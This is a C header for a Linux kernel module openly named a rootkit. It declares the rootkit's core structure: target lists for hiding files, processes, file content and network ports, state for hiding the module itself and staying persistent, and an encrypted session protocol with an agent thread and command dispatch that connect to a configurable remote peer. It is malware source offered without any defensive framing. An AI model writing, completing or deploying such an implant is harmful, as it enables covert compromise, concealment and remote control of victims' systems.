/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <crypto/aead.h>
#include <linux/net.h>
#include <linux/spinlock.h>
#include <linux/types.h>

/* ---- Constants ---- */

#define RK_KEY_LEN		32
#define RK_KEY_HEX_LEN		64
#define RK_NONCE_LEN		12
#define RK_TAG_LEN		16
#define RK_HDR_LEN		(sizeof(struct rk_envelope_hdr))
#define RK_FRAME_MAX		4096
#define RK_BUF_MAX		512
#define RK_MAX_TARGETS		16
#define RK_TARGET_LEN		64

#define RK_DIR_CLIENT		0
#define RK_DIR_SERVER		1

/* ---- Envelope header ---- */

struct rk_envelope_hdr {
	u8	version;
	u8	direction;
	__be64	session_id;
	__be64	sequence;
} __packed;

/* ---- Encrypted session state ---- */

struct rk_session {
	struct crypto_aead	*tfm;
	struct socket		*sock;
	u64			session_id;
	u64			tx_seq;
	u64			rx_seq_expected;
};

/* ---- Target list with spinlock ---- */

struct rk_target_list {
	spinlock_t	lock;
	char		targets[RK_MAX_TARGETS][RK_TARGET_LEN];
	int		count;
};

struct rk_port_list {
	spinlock_t		lock;
	unsigned short		ports[RK_MAX_TARGETS];
	int			count;
};

/* ---- Command dispatch ---- */

typedef int (*rk_handler_t)(struct rk_session *, const char *);

struct rk_cmd_entry {
	const char	*prefix;
	rk_handler_t	handler;
	bool		exact;
};

/* ---- Globals (core/init.c) ---- */

extern u8 rk_key[RK_KEY_LEN];

/* ---- Target lists (core/target.c) ---- */

extern struct rk_target_list rk_file_targets;
extern struct rk_target_list rk_pid_targets;
extern struct rk_target_list rk_content_targets;
extern struct rk_port_list   rk_port_targets;

/* ---- Module state (core/init.c) ---- */

extern struct list_head *rk_saved_prev;
extern bool rk_module_hidden;
extern bool rk_persist_active;

/* ---- Module parameters (core/init.c) ---- */

extern unsigned short peer_port;
extern char peer_addr_str[16];
extern unsigned int retry_base_ms;
extern unsigned int retry_max_ms;

/* ---- core/target.c ---- */

void rk_target_init(struct rk_target_list *tl);
int  rk_target_add(struct rk_target_list *tl, const char *value);
int  rk_target_remove(struct rk_target_list *tl, const char *value);
bool rk_target_match(struct rk_target_list *tl, const char *name);
bool rk_line_matches(struct rk_target_list *tl, const char *line, size_t len);

void rk_port_init(struct rk_port_list *pl);
int  rk_port_add(struct rk_port_list *pl, unsigned short port);
int  rk_port_remove(struct rk_port_list *pl, unsigned short port);
bool rk_port_match(struct rk_port_list *pl, unsigned short port);

/* ---- core/filter.c ---- */

int  rk_filter_init(void);
void rk_filter_exit(void);

/* ---- network/protocol.c ---- */

int rk_send_frame(struct socket *sock, const void *buf, size_t len);
int rk_recv_frame(struct socket *sock, void *buf, size_t max_len,
		  size_t *out_len);

/* ---- crypto/envelope.c ---- */

int rk_send_sealed(struct rk_session *s, const u8 *data, size_t len);
int rk_recv_sealed(struct rk_session *s, u8 *out, size_t max_len,
		   size_t *out_len);

/* ---- execution/dispatch.c ---- */

int rk_dispatch(struct rk_session *s, char *cmd, size_t len);

/* ---- network/agent.c ---- */

int rk_agent_thread(void *data);

#endif /* ROOTKIT_H */
